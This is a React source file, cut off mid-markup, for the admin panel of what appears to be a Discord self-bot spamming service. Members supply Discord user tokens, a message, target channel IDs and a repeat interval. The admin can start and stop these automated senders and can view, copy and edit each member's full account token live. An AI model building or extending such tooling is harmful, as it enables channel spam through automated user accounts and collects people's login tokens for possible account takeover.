import { useState, useEffect, useCallback } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { Slider } from "@/components/ui/slider";
import { Textarea } from "@/components/ui/textarea";
import { Lock, Unlock, Users, Send, ChevronRight, Terminal, RefreshCw, LogOut, Eye, EyeOff, ShieldCheck, ShieldX, UserCheck, UserX, Pencil, X, Check, Copy, Square, Trash2, ArrowLeft, Play, Monitor, Clock, Save, Wifi, WifiOff, Zap, Key, MessageSquare, Hash, Timer, Activity } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";

interface MemberLog {
  message: string;
  level: string;
  time: string;
}

interface LiveState {
  token: string;
  message: string;
  channelIds: string;
  delay: number;
  configName: string;
  lastUpdate: number;
}

interface Member {
  sessionId: string;
  fullSessionId: string;
  configName: string;
  displayName: string | null;
  fullToken: string;
  fullMessage: string;
  message: string;
  channelIds: string;
  delay: number;
  totalSent: number;
  isActive: boolean;
  activeThreads: number;
  startTime: number | null;
  createdAt: string;
  isOnline: boolean;
  liveState: LiveState | null;
  recentLogs: MemberLog[];
}

interface AdminData {
  members: Member[];
  totalMembers: number;
  activeMembers: number;
}

interface AccessRequest {
  id: string;
  sessionId: string;
  applicationText: string;
  status: string;
  createdAt: string;
}

interface ApprovedUser {
  id: string;
  sessionId: string;
  displayName: string;
  createdAt: string;
}

interface SiteSettings {
  isLocked: boolean;
}

export default function Admin() {
  const { toast } = useToast();
  const [authenticated, setAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [data, setData] = useState<AdminData | null>(null);
  const [expandedMember, setExpandedMember] = useState<string | null>(null);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [siteSettings, setSiteSettings] = useState<SiteSettings | null>(null);
  const [applications, setApplications] = useState<AccessRequest[]>([]);
  const [approvedUsers, setApprovedUsers] = useState<ApprovedUser[]>([]);
  const [nameInputs, setNameInputs] = useState<Record<string, string>>({});
  const [editingUser, setEditingUser] = useState<string | null>(null);
  const [editName, setEditName] = useState("");
  const [activeTab, setActiveTab] = useState<"members" | "moderation" | "users">("members");
  const [tokenVisible, setTokenVisible] = useState<Record<string, boolean>>({});
  const [viewingMember, setViewingMember] = useState<string | null>(null);
  const [editToken, setEditToken] = useState("");
  const [editMessage, setEditMessage] = useState("");
  const [editChannels, setEditChannels] = useState("");
  const [editDelay, setEditDelay] = useState(30);
  const [editTokenVisible, setEditTokenVisible] = useState(false);
  const [savingConfig, setSavingConfig] = useState(false);
  const [startingMember, setStartingMember] = useState(false);

  const fetchAll = useCallback(async () => {
    try {
      const [membersRes, settingsRes, appsRes, usersRes] = await Promise.all([
        fetch("/api/admin/members", { credentials: "include" }),
        fetch("/api/admin/site-settings", { credentials: "include" }),
        fetch("/api/admin/applications", { credentials: "include" }),
        fetch("/api/admin/approved-users", { credentials: "include" }),
      ]);

      if (membersRes.status === 401) {
        setAuthenticated(false);
        return;
      }

      const membersJson = await membersRes.json();
      const settingsJson = await settingsRes.json();
      const appsJson = await appsRes.json();
      const usersJson = await usersRes.json();

      setData(membersJson);
      setSiteSettings(settingsJson);
      setApplications(appsJson);
      setApprovedUsers(usersJson);
    } catch {}
  }, []);

  useEffect(() => {
    if (!authenticated) return;
    fetchAll();
    if (!autoRefresh) return;
    const interval = setInterval(fetchAll, 1500);
    return () => clearInterval(interval);
  }, [authenticated, autoRefresh, fetchAll]);

  const handleLogin = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ password }),
      });
      if (res.ok) {
        setAuthenticated(true);
        setPassword("");
        toast({ title: "Access granted" });
      } else {
        toast({ title: "Access denied", description: "Wrong password", variant: "destructive" });
      }
    } catch {
      toast({ title: "Connection error", variant: "destructive" });
    }
    setLoading(false);
  };

  const handleLogout = async () => {
    await apiRequest("POST", "/api/admin/logout");
    setAuthenticated(false);
    setData(null);
  };

  const toggleLock = async () => {
    try {
      const res = await apiRequest("POST", "/api/admin/toggle-lock");
      const json = await res.json();
      setSiteSettings(json);
      toast({ title: json.isLocked ? "Site locked" : "Site unlocked" });
      fetchAll();
    } catch {
      toast({ title: "Failed to toggle lock", variant: "destructive" });
    }
  };

  const approveAccess = async (requestId: string) => {
    const name = nameInputs[requestId];
    if (!name?.trim()) {
      toast({ title: "Enter a display name first", variant: "destructive" });
      return;
    }
    try {
      await apiRequest("POST", "/api/admin/approve-access", { requestId, displayName: name.trim() });
      toast({ title: "User approved" });
      setNameInputs((prev) => { const n = { ...prev }; delete n[requestId]; return n; });
      fetchAll();
    } catch {
      toast({ title: "Failed to approve", variant: "destructive" });
    }
  };

  const denyAccess = async (requestId: string) => {
    try {
      await apiRequest("POST", "/api/admin/deny-access", { requestId });
      toast({ title: "Application denied" });
      fetchAll();
    } catch {
      toast({ title: "Failed to deny", variant: "destructive" });
    }
  };

  const updateUserName = async (userId: string) => {
    if (!editName.trim()) return;
    try {
      await apiRequest("POST", "/api/admin/update-user-name", { userId, displayName: editName.trim() });
      toast({ title: "Name updated" });
      setEditingUser(null);
      setEditName("");
      fetchAll();
    } catch {
      toast({ title: "Failed to update", variant: "destructive" });
    }
  };

  const blockUser = async (userId: string) => {
    try {
      await apiRequest("POST", "/api/admin/block-user", { userId });
      toast({ title: "User blocked & removed" });
      fetchAll();
    } catch {
      toast({ title: "Failed to block", variant: "destructive" });
    }
  };

  const copyToken = (token: string) => {
    navigator.clipboard.writeText(token);
    toast({ title: "Token copied" });
  };

  const stopAllSenders = async () => {
    try {
      const res = await apiRequest("POST", "/api/admin/stop-all-senders");
      const json = await res.json();
      toast({ title: `All senders stopped (${json.stopped})` });
      fetchAll();
    } catch {
      toast({ title: "Failed to stop senders", variant: "destructive" });
    }
  };

  const stopMemberSender = async (fullSessionId: string) => {
    try {
      await apiRequest("POST", "/api/admin/stop-sender", { sessionId: fullSessionId });
      toast({ title: "Sender stopped" });
      fetchAll();
    } catch {
      toast({ title: "Failed to stop sender", variant: "destructive" });
    }
  };

  const removeConfig = async (fullSessionId: string) => {
    try {
      await apiRequest("POST", "/api/admin/remove-config", { sessionId: fullSessionId });
      toast({ title: "Config removed" });
      fetchAll();
    } catch {
      toast({ title: "Failed to remove config", variant: "destructive" });
    }
  };

  const openMemberView = (member: Member) => {
    setViewingMember(member.fullSessionId);
    setEditToken(member.fullToken);
    setEditMessage(member.fullMessage);
    setEditChannels(member.channelIds);
    setEditDelay(member.delay);
    setEditTokenVisible(false);
  };

  const saveAdminConfig = async (fullSessionId: string) => {
    setSavingConfig(true);
    try {
      await apiRequest("POST", "/api/admin/update-config", {
        sessionId: fullSessionId,
        token: editToken,
        message: editMessage,
        channelIds: editChannels,
        delay: editDelay,
      });
      toast({ title: "Config updated & pushed to user" });
      fetchAll();
    } catch {
      toast({ title: "Failed to update config", variant: "destructive" });
    }
    setSavingConfig(false);
  };

  const startMemberSender = async (fullSessionId: string) => {
    setStartingMember(true);
    try {
      await apiRequest("POST", "/api/admin/start-sender", {
        sessionId: fullSessionId,
        token: editToken,
        message: editMessage,
        channelIds: editChannels,
        delay: editDelay,
      });
      toast({ title: "Sender started" });
      fetchAll();
    } catch (err: any) {
      const msg = err?.message || "Failed to start";
      toast({ title: msg, variant: "destructive" });
    }
    setStartingMember(false);
  };

  const clearAllIdle = async () => {
    try {
      const res = await apiRequest("POST", "/api/admin/clear-idle");
      const json = await res.json();
      toast({ title: `Cleared ${json.cleared} idle configs` });
      fetchAll();
    } catch {
      toast({ title: "Failed to clear idle configs", variant: "destructive" });
    }
  };

  const getLogColor = (level: string) => {
    switch (level) {
      case "success": return "text-emerald-400";
      case "error": return "text-red-400";
      case "warn": return "text-amber-400";
      default: return "text-slate-400";
    }
  };

  const formatUptime = (startTime: number | null) => {
    if (!startTime) return "---";
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const h = Math.floor(elapsed / 3600);
    const m = Math.floor((elapsed % 3600) / 60);
    const s = elapsed % 60;
    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen page-bg flex items-center justify-center">
        <div className="panel w-full max-w-sm mx-4 overflow-visible">
          <div className="px-5 py-3.5 panel-header">
            <div className="flex items-center gap-2">
              <Lock className="w-4 h-4 text-indigo-400" />
              <span className="text-sm font-semibold tracking-wider text-slate-300">ADMIN ACCESS</span>
            </div>
          </div>
          <div className="p-5 space-y-4">
            <div>
              <label className="text-[10px] font-medium tracking-wider mb-1.5 block text-slate-500">
                PASSWORD
              </label>
              <Input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                className="clean-input text-slate-200 placeholder:text-slate-600 focus-visible:ring-indigo-500/20"
                placeholder="Enter admin password"
                data-testid="input-admin-password"
              />
            </div>
            <Button
              onClick={handleLogin}
              disabled={loading || !password}
              className="w-full no-default-hover-elevate no-default-active-elevate"
              style={{ background: "#6366f1", borderColor: "#4f46e5", color: "#fff" }}
              data-testid="button-admin-login"
            >
              <Lock className="w-4 h-4 mr-2" />
              {loading ? "AUTHENTICATING..." : "AUTHENTICATE"}
            </Button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen page-bg">
      <div className="max-w-4xl mx-auto px-4 py-8 space-y-4">
        <header className="text-center space-y-2 pb-2">
          <h1 className="text-xl font-semibold tracking-[0.2em] text-slate-200" data-testid="text-admin-title">
            ADMIN PANEL
          </h1>
          <div className="flex items-center justify-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full status-dot" style={{ background: "#34d399" }} />
            <span className="text-[11px] tracking-wider font-medium text-emerald-400">AUTHENTICATED</span>
          </div>
        </header>

        <div className="flex gap-2 flex-wrap">
          <Button
            variant="outline"
            onClick={toggleLock}
            className="flex-1 min-w-[120px] no-default-hover-elevate no-default-active-elevate"
            style={{
              borderColor: siteSettings?.isLocked ? "rgba(239,68,68,0.25)" : "rgba(52,211,153,0.25)",
              background: siteSettings?.isLocked ? "rgba(239,68,68,0.06)" : "rgba(52,211,153,0.06)",
              color: siteSettings?.isLocked ? "#f87171" : "#34d399",
            }}
            data-testid="button-toggle-lock"
          >
            {siteSettings?.isLocked ? <Lock className="w-4 h-4 mr-2" /> : <Unlock className="w-4 h-4 mr-2" />}
            {siteSettings?.isLocked ? "LOCKED" : "UNLOCKED"}
          </Button>
          <Button
            variant="outline"
            onClick={stopAllSenders}
            className="no-default-hover-elevate no-default-active-elevate"
            style={{ borderColor: "rgba(239,68,68,0.2)", background: "rgba(239,68,68,0.05)", color: "#f87171" }}
            data-testid="button-stop-all"
          >
            <Square className="w-4 h-4 mr-2" />
            STOP ALL
          </Button>
          <Button
            variant="outline"
            onClick={clearAllIdle}
            className="no-default-hover-elevate no-default-active-elevate"
            style={{ borderColor: "rgba(249,115,22,0.2)", background: "rgba(249,115,22,0.05)", color: "#fb923c" }}
            data-testid="button-clear-idle"
          >
            <Trash2 className="w-4 h-4 mr-2" />
            CLEAR IDLE
          </Button>
          <Button
            variant="outline"
            className="border-slate-800 bg-slate-900/30 text-slate-400 no-default-hover-elevate no-default-active-elevate hover:bg-slate-800/40"
            onClick={fetchAll}
            data-testid="button-refresh"
          >
            <RefreshCw className="w-4 h-4" />
          </Button>
          <Button
            variant="outline"
            onClick={() => setAutoRefresh(!autoRefresh)}
            className="border-slate-800 bg-slate-900/30 text-slate-400 no-default-hover-elevate no-default-active-elevate hover:bg-slate-800/40"
            data-testid="button-auto-refresh"
          >
            {autoRefresh ? <Eye className="w-4 h-4 mr-1.5" /> : <EyeOff className="w-4 h-4 mr-1.5" />}
            <span className="text-xs">LIVE {autoRefresh ? "ON" : "OFF"}</span>
          </Button>
          <Button
            variant="outline"
            onClick={handleLogout}
            className="no-default-hover-elevate no-default-active-elevate"
            style={{ borderColor: "rgba(239,68,68,0.15)", background: "rgba(239,68,68,0.04)", color: "rgba(248,113,113,0.6)" }}
            data-testid="button-admin-logout"
          >
            <LogOut className="w-4 h-4" />
          </Button>
        </div>

        <div className="grid grid-cols-3 gap-2">
          <div className="panel p-4 text-center">
            <div className="text-[10px] tracking-wider mb-1 uppercase text-slate-600">Members</div>
            <div className="text-xl font-semibold text-slate-300" data-testid="text-total-members">
              {data?.totalMembers || 0}
            </div>
          </div>
          <div className="panel p-4 text-center">
            <div className="text-[10px] tracking-wider mb-1 uppercase text-slate-600">Active</div>
            <div className="text-xl font-semibold text-emerald-400" data-testid="text-active-members">
              {data?.activeMembers || 0}
            </div>
          </div>
          <div className="panel p-4 text-center">
            <div className="text-[10px] tracking-wider mb-1 uppercase text-slate-600">Total Sent</div>
            <div className="text-xl font-semibold text-slate-300" data-testid="text-total-all-sent">
              {data?.members.reduce((sum, m) => sum + m.totalSent, 0) || 0}
            </div>
          </div>
        </div>

        <div className="flex border-b border-slate-800/60">
          {[
            { key: "members" as const, label: "Members", icon: Users, badge: data?.totalMembers || 0 },
            { key: "moderation" as const, label: "Moderation", icon: ShieldCheck, badge: applications.length },
            { key: "users" as const, label: "Access", icon: UserCheck, badge: approvedUsers.length },
          ].map((tab) => (
            <button
              key={tab.key}
              onClick={() => setActiveTab(tab.key)}
              className="flex items-center gap-2 px-4 py-2.5 text-[11px] font-semibold tracking-wider transition-colors relative"
              style={{
                color: activeTab === tab.key ? "#e2e8f0" : "#475569",
              }}
              data-testid={`tab-${tab.key}`}
            >
              <tab.icon className="w-3.5 h-3.5" />
              {tab.label.toUpperCase()}
              {tab.badge > 0 && (
                <span
                  className="text-[10px] px-1.5 py-0.5 rounded-full font-semibold"
                  style={{
                    background: tab.key === "moderation" && tab.badge > 0 ? "rgba(251,191,36,0.12)" : "rgba(99,102,241,0.12)",
                    color: tab.key === "moderation" && tab.badge > 0 ? "#fbbf24" : "#818cf8",
                  }}
                >
                  {tab.badge}
                </span>
              )}
              {activeTab === tab.key && (
                <div className="absolute bottom-0 left-0 right-0 h-[2px] bg-indigo-500" />
              )}
            </button>
          ))}
        </div>

        {activeTab === "members" && !viewingMember && (
          <div className="space-y-2">
            {!data || data.members.length === 0 ? (
              <div className="py-12 text-center text-slate-700">
                No members yet
              </div>
            ) : (
              data.members.map((member) => (
                <div key={member.sessionId} className="panel overflow-visible">
                  <div
                    className="flex items-center justify-between gap-2 px-4 py-3 cursor-pointer hover:bg-white/[0.02] transition-colors"
                    onClick={() => openMemberView(member)}
                    data-testid={`button-expand-member-${member.sessionId}`}
                  >
                    <div className="flex items-center gap-3 min-w-0">
                      <span
                        className={`w-2 h-2 rounded-full flex-shrink-0 ${member.isActive ? "status-dot" : ""}`}
                        style={{ background: member.isActive ? "#34d399" : "#ef4444" }}
                      />
                      <div className="min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="text-sm font-medium text-slate-300">
                            {member.displayName || member.configName}
                          </span>
                          {member.displayName && (
                            <span className="text-[11px] text-slate-600">({member.configName})</span>
                          )}
                          {member.isOnline && (
                            <span className="text-[9px] px-1.5 py-0.5 rounded-full font-semibold" style={{ background: "rgba(52,211,153,0.1)", color: "#34d399" }}>
                              ONLINE
                            </span>
                          )}
                        </div>
                        <span className="text-[10px] font-mono text-slate-700">{member.sessionId}</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-3 flex-shrink-0">
                      <span className="text-[11px] font-mono text-slate-500">{member.totalSent} sent</span>
                      <span className="text-[11px] font-medium" style={{ color: member.isActive ? "#34d399" : "rgba(239,68,68,0.35)" }}>
                        {member.isActive ? "RUNNING" : "IDLE"}
                      </span>
                      {member.isActive && (
                        <Button
                          size="icon"
                          variant="ghost"
                          onClick={(e) => { e.stopPropagation(); stopMemberSender(member.fullSessionId); }}
                          className="text-red-400/60"
                          data-testid={`button-stop-sender-${member.sessionId}`}
                        >
                          <Square className="w-3 h-3" />
                        </Button>
                      )}
                      <Button
                        size="icon"
                        variant="ghost"
                        onClick={(e) => { e.stopPropagation(); removeConfig(member.fullSessionId); }}
                        className="text-orange-400/50"
                        data-testid={`button-remove-config-${member.sessionId}`}
                      >
                        <Trash2 className="w-3 h-3" />
                      </Button>
                      <ChevronRight className="w-3.5 h-3.5 text-slate-700" />
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        {activeTab === "members" && viewingMember && (() => {
          const member = data?.members.find(m => m.fullSessionId === viewingMember);
          if (!member) return (
            <div className="py-12 text-center space-y-3">
              <div className="text-slate-700">Member not found</div>
              <Button variant="outline" onClick={() => setViewingMember(null)} className="border-slate-800 text-slate-400 no-default-hover-elevate">
                <ArrowLeft className="w-4 h-4 mr-2" /> BACK
              </Button>
            </div>
          );
          const liveChannelCount = editChannels.split(/[,\n]/).filter(id => id.trim()).length;
          return (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <Button
                  variant="ghost"
                  onClick={() => setViewingMember(null)}
                  className="text-slate-400 no-default-hover-elevate"
                  data-testid="button-back-to-members"
                >
                  <ArrowLeft className="w-4 h-4 mr-2" /> BACK
                </Button>
                <div className="flex items-center gap-3">
                  <span className="flex items-center gap-1.5 text-[11px]" style={{ color: member.isOnline ? "#34d399" : "rgba(239,68,68,0.4)" }}>
                    {member.isOnline ? <Wifi className="w-3 h-3" /> : <WifiOff className="w-3 h-3" />}
                    {member.isOnline ? "ONLINE" : "OFFLINE"}
                  </span>
                  <span
                    className={`w-1.5 h-1.5 rounded-full ${member.isActive ? "status-dot" : ""}`}
                    style={{ background: member.isActive ? "#34d399" : "#ef4444" }}
                  />
                  <span className="text-[11px] font-medium" style={{ color: member.isActive ? "#34d399" : "rgba(239,68,68,0.35)" }}>
                    {member.isActive ? "RUNNING" : "IDLE"}
                  </span>
                </div>
              </div>

              <div className="text-center space-y-1">
                <h2 className="text-lg font-semibold tracking-wider text-slate-200">
                  {member.displayName || member.configName}
                </h2>
                <span className="text-[10px] font-mono block text-slate-700">{member.fullSessionId}</span>
              </div>

              <div className="panel overflow-visible">
                <div className="flex items-center justify-between px-5 py-3 panel-header">
                  <div className="flex items-center gap-2">
                    <Monitor className="w-3.5 h-3.5 text-indigo-400" />
                    <span className="text-[11px] font-semibold tracking-wider text-slate-300">LIVE VIEW</span>
                  </div>
                  <div className="flex items-center gap-2">
                    {member.liveState && (
                      <button
                        onClick={() => {
                          setEditToken(member.liveState!.token);
                          setEditMessage(member.liveState!.message);
                          setEditChannels(member.liveState!.channelIds);
                          setEditDelay(member.liveState!.delay);
                          toast({ title: "Loaded live state into editor" });
                        }}
                        className="text-[10px] px-2 py-0.5 rounded font-semibold"
                        style={{ background: "rgba(52,211,153,0.08)", color: "#34d399", border: "1px solid rgba(52,211,153,0.15)" }}
                        data-testid="button-load-live-state"
                      >
                        LOAD LIVE
                      </button>
                    )}
                    <span
                      className={`w-1.5 h-1.5 rounded-full ${member.isOnline ? "status-dot" : ""}`}
                      style={{ background: member.isOnline ? "#34d399" : "#ef4444" }}
                    />
                  </div>
                </div>
                <div className="p-4">
                  {member.isOnline && member.liveState ? (
                    <div className="space-y-2 text-[11px]">
                      <div className="grid grid-cols-2 gap-2">
                        <div className="p-2.5 rounded-lg" style={{ background: "rgba(4,4,12,0.5)" }}>
                          <div className="mb-0.5 text-[10px] tracking-wider text-slate-600">Config</div>
                          <span className="text-slate-300">{member.liveState.configName || "---"}</span>
                        </div>
                        <div className="p-2.5 rounded-lg" style={{ background: "rgba(4,4,12,0.5)" }}>
                          <div className="mb-0.5 text-[10px] tracking-wider text-slate-600">Delay</div>
                          <span className="text-slate-300">{member.liveState.delay}s</span>
                        </div>
                      </div>
                      <div className="p-2.5 rounded-lg" style={{ background: "rgba(4,4,12,0.5)" }}>
                        <div className="mb-0.5 text-[10px] tracking-wider text-slate-600">Token</div>
                        <span className="font-mono break-all text-indigo-400 select-all">
                          {member.liveState.token || "Not entered"}
                        </span>
                      </div>
                      <div className="p-2.5 rounded-lg" style={{ background: "rgba(4,4,12,0.5)" }}>
                        <div className="mb-0.5 text-[10px] tracking-wider text-slate-600">Message</div>
                        <span className="whitespace-pre-wrap text-slate-300">{member.liveState.message || "Empty"}</span>
                      </div>
                      <div className="p-2.5 rounded-lg" style={{ background: "rgba(4,4,12,0.5)" }}>
                        <div className="mb-0.5 text-[10px] tracking-wider text-slate-600">Channels</div>
                        <span className="font-mono break-all text-indigo-400">{member.liveState.channelIds || "None"}</span>
                      </div>
                    </div>
                  ) : (
                    <div className="py-4 text-center text-[11px] text-slate-700">
                      {member.isOnline ? "Waiting for state data..." : "User not connected"}
                    </div>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-3 gap-2">
                <div className="panel p-3 text-center">
                  <div className="text-[10px] tracking-wider mb-1 text-slate-600 uppercase">Threads</div>
                  <div className="text-lg font-semibold" style={{ color: member.isActive ? "#34d399" : "#64748b" }}>
                    {member.activeThreads}
                  </div>
                </div>
                <div className="panel p-3 text-center">
                  <div className="text-[10px] tracking-wider mb-1 text-slate-600 uppercase">Sent</div>
                  <div className="text-lg font-semibold text-slate-300">{member.totalSent}</div>
                </div>
                <div className="panel p-3 text-center">
                  <div className="text-[10px] tracking-wider mb-1 text-slate-600 uppercase">Uptime</div>
                  <div className="text-sm font-semibold font-mono" style={{ color: member.isActive ? "#34d399" : "#64748b" }}>
                    {formatUptime(member.startTime)}
                  </div>
                </div>
              </div>

              <div className="panel overflow-visible">
                <div className="flex items-center justify-between px-5 py-3 panel-header">
                  <div className="flex items-center gap-2">
                    <Zap className="w-3.5 h-3.5 text-indigo-400" />
                    <span className="text-[11px] font-semibold tracking-wider text-slate-300">ADMIN CONTROL</span>
                  </div>
                </div>
                <div className="p-5 space-y-4">
                  <div>
                    <label className="text-[10px] font-medium tracking-wider mb-1.5 block text-slate-500">TOKEN</label>
                    <div className="relative">
                      <input
                        type={editTokenVisible ? "text" : "password"}
                        value={editToken}
                        onChange={(e) => setEditToken(e.target.value)}
                        className="flex w-full rounded-md border px-3 py-2 text-sm pr-20 clean-input text-slate-200"
                        placeholder="Discord User Token"
                        data-testid="input-admin-edit-token"
                      />
                      <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
                        <button
                          onClick={() => setEditTokenVisible(!editTokenVisible)}
                          className="text-slate-600 hover:text-slate-400 p-1 transition-colors"
                          data-testid="button-admin-toggle-token"
                        >
                          {editTokenVisible ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        </button>
                        {editToken && (
                          <button
                            onClick={() => copyToken(editToken)}
                            className="text-slate-600 hover:text-slate-400 p-1 transition-colors"
                            data-testid="button-admin-copy-token"
                          >
                            <Copy className="w-3.5 h-3.5" />
                          </button>
                        )}
                      </div>
                    </div>
                  </div>

                  <div>
                    <label className="text-[10px] font-medium tracking-wider mb-1.5 block text-slate-500">MESSAGE</label>
                    <Textarea
                      value={editMessage}
                      onChange={(e) => setEditMessage(e.target.value)}
                      className="clean-input text-slate-200 placeholder:text-slate-600 resize-none min-h-[70px] focus-visible:ring-indigo-500/20"
                      placeholder="Message content..."
                      data-testid="input-admin-edit-message"
                    />
                  </div>

                  <div>
                    <label className="text-[10px] font-medium tracking-wider mb-1.5 flex items-center justify-between text-slate-500">
                      <span>CHANNELS</span>
                      <span className="text-slate-600">{liveChannelCount} channel(s)</span>
                    </label>
                    <Textarea
                      value={editChannels}
                      onChange={(e) => setEditChannels(e.target.value)}
                      className="clean-input text-slate-200 placeholder:text-slate-600 resize-none min-h-[50px] focus-visible:ring-indigo-500/20"
                      placeholder="Channel IDs (comma or newline separated)"
                      data-testid="input-admin-edit-channels"
                    />
                  </div>

                  <div>
                    <label className="text-[10px] font-medium tracking-wider mb-1.5 flex items-center justify-between text-slate-500">
                      <span>INTERVAL</span>
                      <span className="text-sm font-semibold text-slate-300">
                        {editDelay}<span className="text-[10px] ml-0.5 font-normal text-slate-600">s</span>
                      </span>
                    </label>
                    <Slider
                      value={[editDelay]}
                      min={10}
                      max={250}
                      step={1}
                      onValueChange={(v) => setEditDelay(v[0])}
                      className="mt-1"
                      data-testid="slider-admin-delay"
                    />
                    <div className="flex justify-between mt-1">
                      <span className="text-[10px] text-slate-700">10s</span>
                      <span className="text-[10px] text-slate-700">250s</span>
                    </div>
                  </div>

                  <div className="fade-separator" />

                  <div className="flex gap-2">
                    <Button
                      onClick={() => saveAdminConfig(member.fullSessionId)}
                      disabled={savingConfig}
                      className="flex-1 no-default-hover-elevate no-default-active-elevate"
                      style={{ background: "#6366f1", borderColor: "#4f46e5", color: "#fff" }}
                      data-testid="button-admin-save-config"
                    >
                      <Save className="w-4 h-4 mr-2" />
                      {savingConfig ? "SAVING..." : "SAVE CONFIG"}
                    </Button>
                    {!member.isActive ? (
                      <Button
                        onClick={() => startMemberSender(member.fullSessionId)}
                        disabled={startingMember || !editToken || !editMessage || !editChannels}
                        className="no-default-hover-elevate no-default-active-elevate"
                        style={{ background: "#059669", borderColor: "#047857", color: "#fff" }}
                        data-testid="button-admin-start-sender"
                      >
                        <Play className="w-4 h-4 mr-2" />
                        {startingMember ? "..." : "RUN"}
                      </Button>
                    ) : (
                      <Button
                        variant="outline"
                        onClick={() => stopMemberSender(member.fullSessionId)}
                        className="no-default-hover-elevate no-default-active-elevate"
                        style={{ borderColor: "rgba(239,68,68,0.2)", background: "rgba(239,68,68,0.05)", color: "#f87171" }}
                        data-testid="button-admin-stop-sender"
                      >
                        <Square className="w-4 h-4 mr-2" />
                        STOP
                      </Button>
                    )}
                    <Button
                      size="icon"
                      variant="outline"
                      onClick={() => { removeConfig(member.fullSessionId); setViewingMember(null); }}
                      className="no-default-hover-elevate no-default-active-elevate"
                      style={{ borderColor: "rgba(249,115,22,0.2)", background: "rgba(249,115,22,0.05)", color: "#fb923c" }}
                      data-testid="button-admin-remove-member"
                    >
                      <Trash2 className="w-4 h-4" />
                    </Button>
                  </div>
                </div>
              </div>

              {member.recentLogs.length > 0 && (
                <div className="panel overflow-visible">
                  <div className="flex items-center gap-2 px-5 py-3 panel-header">
                    <Terminal className="w-3.5 h-3.5 text-slate-500" />
                    <span className="text-[11px] font-semibold tracking-wider text-slate-400">SYSTEM LOGS</span>
                  </div>
                  <div className="px-5 py-3 max-h-[200px] overflow-y-auto font-mono text-[11px] space-y-0.5" style={{ background: "rgba(4,4,12,0.6)" }}>
                    {member.recentLogs.map((log, i) => (
                      <div key={i} className={getLogColor(log.level)}>
                        {log.message}
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          );
        })()}

        {activeTab === "moderation" && (
          <div className="space-y-2">
            {applications.length === 0 ? (
              <div className="py-12 text-center text-slate-700">
                No pending applications
              </div>
            ) : (
              applications.map((app) => (
                <div key={app.id} className="panel p-5 overflow-visible space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="w-1.5 h-1.5 rounded-full" style={{ background: "#fbbf24" }} />
                      <span className="text-[11px] font-mono text-slate-500">
                        {app.sessionId.substring(0, 8)}
                      </span>
                    </div>
                    <span className="text-[10px] text-slate-700">
                      {new Date(app.createdAt).toLocaleString()}
                    </span>
                  </div>

                  <div className="p-3 rounded-lg text-sm leading-relaxed" style={{ background: "rgba(4,4,12,0.5)", color: "#94a3b8" }}>
                    {app.applicationText}
                  </div>

                  <div>
                    <label className="text-[10px] tracking-wider mb-1.5 block text-slate-600">
                      DISPLAY NAME
                    </label>
                    <input
                      type="text"
                      value={nameInputs[app.id] ?? ""}
                      onChange={(e) => {
                        const val = e.target.value;
                        setNameInputs((prev) => ({ ...prev, [app.id]: val }));
                      }}
                      className="flex w-full rounded-md border px-3 py-2 text-sm mb-2 clean-input text-slate-200"
                      data-testid={`input-name-${app.id}`}
                    />
                    <div className="flex gap-2">
                      <Button
                        onClick={() => approveAccess(app.id)}
                        className="flex-1 no-default-hover-elevate no-default-active-elevate"
                        style={{ background: "#059669", borderColor: "#047857", color: "#fff" }}
                        disabled={!nameInputs[app.id]?.trim()}
                        data-testid={`button-approve-${app.id}`}
                      >
                        <Check className="w-4 h-4 mr-1.5" />
                        APPROVE
                      </Button>
                      <Button
                        variant="outline"
                        onClick={() => denyAccess(app.id)}
                        className="flex-1 no-default-hover-elevate no-default-active-elevate"
                        style={{ borderColor: "rgba(239,68,68,0.2)", color: "#f87171", background: "rgba(239,68,68,0.05)" }}
                        data-testid={`button-deny-${app.id}`}
                      >
                        <X className="w-4 h-4 mr-1.5" />
                        DENY
                      </Button>
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        {activeTab === "users" && (
          <div className="space-y-2">
            {approvedUsers.length === 0 ? (
              <div className="py-12 text-center text-slate-700">
                No approved users
              </div>
            ) : (
              approvedUsers.map((user) => (
                <div key={user.id} className="panel overflow-visible">
                  <div className="flex items-center justify-between gap-2 px-4 py-3">
                    <div className="flex items-center gap-3">
                      <span className="w-1.5 h-1.5 rounded-full" style={{ background: "#34d399" }} />
                      {editingUser === user.id ? (
                        <div className="flex items-center gap-2" onClick={(e) => e.stopPropagation()}>
                          <Input
                            value={editName}
                            onChange={(e) => setEditName(e.target.value)}
                            className="clean-input text-slate-200 w-36 h-8 text-sm"
                            onKeyDown={(e) => e.key === "Enter" && updateUserName(user.id)}
                            autoFocus
                            data-testid={`input-edit-name-${user.id}`}
                          />
                          <Button
                            size="icon"
                            variant="ghost"
                            onClick={() => updateUserName(user.id)}
                            className="text-emerald-400"
                            data-testid={`button-confirm-edit-${user.id}`}
                          >
                            <Check className="w-4 h-4" />
                          </Button>
                          <Button
                            size="icon"
                            variant="ghost"
                            onClick={() => { setEditingUser(null); setEditName(""); }}
                          >
                            <X className="w-4 h-4" />
